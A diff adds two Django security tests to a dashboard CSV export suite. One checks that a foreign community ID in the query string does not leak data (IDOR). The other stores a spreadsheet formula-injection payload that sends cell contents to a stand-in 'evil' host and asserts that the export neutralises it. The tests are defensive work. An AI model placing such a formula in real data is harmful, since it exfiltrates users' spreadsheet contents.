@@ -246,6 +246,35 @@ class DashboardCsvExportTest(TestCase):
             'CSV response must start with UTF-8 BOM',
         )
 
+    def test_csv_blocks_other_community_data_by_query_param(self):
+        """?format=csv&community={他人のID} でも自分の community 範囲外のデータは含まれない。"""
+        # 他人の community を作成し event_detail と analytics を仕込む
+        other = _create_community('OtherCommunity')
+        other_ed = _create_event_detail(other, '他人の記事X', event_date=date(2026, 5, 1))
+        _make_analytics(other, page_path=f'/event/detail/{other_ed.id}/',
+                        content_type=PageAnalytics.ContentType.EVENT_DETAIL,
+                        object_id=other_ed.id, date_=timezone.localdate(), pv=999)
+
+        response = self.client.get(
+            reverse('analytics:dashboard'),
+            {'format': 'csv', 'community': other.id},
+        )
+        content = response.content.decode('utf-8-sig')
+        # 他人 community の名前と記事タイトルは CSV に含まれない（IDOR防止）
+        self.assertNotIn('OtherCommunity', content)
+        self.assertNotIn('他人の記事X', content)
+
+    def test_csv_escapes_formula_injection(self):
+        """先頭が =,+,-,@ の文字列はシングルクォートで無害化される。"""
+        # theme を悪意ある式に書き換え
+        self.ed.theme = '=HYPERLINK("http://evil/?leak=" & A1, "click")'
+        self.ed.save()
+
+        response = self.client.get(reverse('analytics:dashboard'), {'format': 'csv'})
+        content = response.content.decode('utf-8-sig')
+        # シングルクォート付きで埋め込まれる（Excel で数式評価されない）
+        self.assertIn("'=HYPERLINK", content)
+
 
 class ServiceFunctionsTest(TestCase):
     """services.py の集計関数を直接検証。"""
